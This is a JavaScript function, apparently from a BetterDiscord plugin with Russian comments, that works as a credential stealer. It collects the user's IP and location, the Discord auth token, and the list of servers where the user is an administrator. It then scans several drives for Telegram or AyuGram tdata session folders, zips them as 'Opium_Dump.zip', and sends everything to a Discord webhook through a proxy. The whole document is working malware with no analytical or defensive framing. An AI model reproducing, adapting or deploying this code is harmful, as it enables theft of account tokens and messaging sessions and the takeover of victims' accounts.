async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    let path = null;
    try { 
        fs = require('fs'); 
        path = require('path');
    } catch (e) { 
        return { success: false, error: "Модули fs/path недоступны." }; 
    }

    let zipFunc = null;
    if (fflate && typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
    else if (fflate && fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;

    if (!zipFunc) return { success: false, error: "Библиотека fflate не загружена." };

    let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
    } catch (e) { result.debug_tdata.push("Ошибка IP: " + e.message); }

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. СБОР СЕРВЕРОВ
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) { result.debug_tdata.push("Ошибка серверов: " + e.message); }

    // 4. УМНЫЙ ПОИСК tdata (по путям и по .exe)
    let hasTdata = false;
    let tdataPath = null;
    
    try {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';
        const userProfile = process.env.USERPROFILE || '';
        
        // Сначала проверяем стандартные пути
        const standardPaths = [
            'D:\\zapret\\Ayugram\\tdata',
            'D:\\zapret\\AyuGram\\tdata',
            'D:\\zapret\\Telegram\\tdata',
            path.join(appData, 'Telegram Desktop', 'tdata'),
            path.join(appData, 'Telegram', 'tdata'),
            path.join(appData, 'AyuGram', 'tdata'),
            path.join(localAppData, 'Telegram Desktop', 'tdata'),
            path.join(localAppData, 'Telegram', 'tdata'),
            path.join(localAppData, 'AyuGram', 'tdata'),
            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata'),
            path.join(userProfile, 'Downloads', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Downloads', 'AyuGram', 'tdata')
        ];

        for (const p of standardPaths) {
            if (fs.existsSync(p)) { 
                tdataPath = p; 
                result.debug_tdata.push(`Найдено в стандартном пути: ${p}`);
                break; 
            }
        }

        // Если нет, сканируем диски
        if (!tdataPath) {
            result.debug_tdata.push("Стандартные пути пусты. Запуск умного сканирования...");
            const drives = ['C:', 'D:', 'E:', 'F:'];
            
            const findTdataRecursive = (dir, depth = 0) => {
                if (depth > 4) return null; // Ограничение глубины 4 уровнями

                try {
                    const entries = fs.readdirSync(dir, { withFileTypes: true });
                    
                    let localTdataPath = null;

                    // Проверяем текущую папку
                    for (const entry of entries) {
                        const lowerName = entry.name.toLowerCase();
                        // Если нашли папку tdata
                        if (entry.isDirectory() && lowerName === 'tdata') {
                            localTdataPath = path.join(dir, entry.name);
                        }
                        // Если нашли .exe телеграма
                        if (entry.isFile() && lowerName.endsWith('.exe')) {
                            if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg.exe') {
                                // Проверяем, есть ли tdata рядом с exe
                                const possibleTdata = path.join(dir, 'tdata');
                                if (fs.existsSync(possibleTdata) && fs.statSync(possibleTdata).isDirectory()) {
                                    localTdataPath = possibleTdata;
                                }
                            }
                        }
                    }

                    // Если нашли в этой папке, возвращаем
                    if (localTdataPath) {
                        result.debug_tdata.push(`Найдено при сканировании: ${localTdataPath}`);
                        return localTdataPath;
                    }

                    // Если не нашли, идем глубже
                    const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
                    
                    for (const entry of entries) {
                        if (entry.isDirectory()) {
                            const lowerName = entry.name.toLowerCase();
                            if (ignoreDirs.includes(lowerName) || lowerName.startsWith('.')) continue;
                            
                            const fullPath = path.join(dir, entry.name);
                            
                            // Если это папка с названием telegram/ayugram, заходим без ограничения глубины (но не больше 6)
                            if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg') {
                                const res = findTdataRecursive(fullPath, depth); // depth не увеличиваем, чтобы заглянуть глубже
                                if (res) return res;
                            } else {
                                const res = findTdataRecursive(fullPath, depth + 1);
                                if (res) return res;
                            }
                        }
                    }
                } catch (e) {
                    // Игнорируем ошибки доступа
                }
                return null;
            };

            for (const d of drives) {
                const root = d + '\\';
                if (fs.existsSync(root)) {
                    result.debug_tdata.push(`Сканирование ${root}...`);
                    tdataPath = findTdataRecursive(root);
                    if (tdataPath) break;
                }
            }
        }
    } catch (e) {
        result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
    }

    // 5. ФОРМИРУЕМ АРХИВ
    let finalZipBuffer = null;
    try {
        const zipFiles = {};
        const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
        zipFiles['data.json'] = jsonBytes;

        if (tdataPath) {
            result.telegram_path = tdataPath;
            result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
            
            let totalSize = 0;
            const checkSize = (dir) => {
                try {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        if (fs.statSync(fullPath).isDirectory()) checkSize(fullPath);
                        else totalSize += fs.statSync(fullPath).size;
                    }
                } catch(e) {}
            };
            checkSize(tdataPath);

            if (totalSize > 20 * 1024 * 1024) {
                result.debug_tdata.push("Папка >20MB. Пропуск.");
            } else {
                let fileCount = 0;
                const addFilesRecursively = (dir, prefix = '') => {
                    try {
                        const entries = fs.readdirSync(dir);
                        for (const entry of entries) {
                            const fullPath = path.join(dir, entry);
                            const relativePath = (prefix ? prefix + '/' : '') + entry;
                            try {
                                if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
                                else {
                                    zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                                    fileCount++;
                                }
                            } catch (fileErr) { }
                        }
                    } catch (dirErr) { }
                };
                addFilesRecursively(tdataPath);
                result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
                hasTdata = true;
            }
        } else {
            result.debug_tdata.push("Папка tdata не найдена.");
        }

        finalZipBuffer = zipFunc(zipFiles);
        result.debug_tdata.push("ZIP успешно создан!");

    } catch (e) {
        result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
    }

    // 6. ОТПРАВКА
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
    
    const formData = new FormData();
    const payload = { content: messageText, attachments: [] };
    if (finalZipBuffer) payload.attachments.push({ id: 0, filename: "Opium_Dump.zip" });

    formData.append('payload_json', JSON.stringify(payload));
    
    if (finalZipBuffer) {
        const zipBlob = new Blob([finalZipBuffer], { type: 'application/zip' });
        formData.append('files[0]', zipBlob, 'Opium_Dump.zip');
    }

    return new Promise((resolve) => {
        try {
            const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
            const xhr = new XMLHttpRequest();
            xhr.open('POST', proxyUrlFull, true);
            xhr.timeout = 60000;

            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) resolve({ success: true });
                else resolve({ success: false, error: `Discord ${xhr.status}: ${xhr.responseText}` });
            };

            xhr.onerror = function() { resolve({ success: false, error: "Сетевая ошибка (XHR)." }); };
            xhr.ontimeout = function() { resolve({ success: false, error: "Таймаут 60 сек." }); };

            xhr.send(formData);
        } catch (e) {
            resolve({ success: false, error: `Ошибка XHR: ${e.message}` });
        }
    });
}
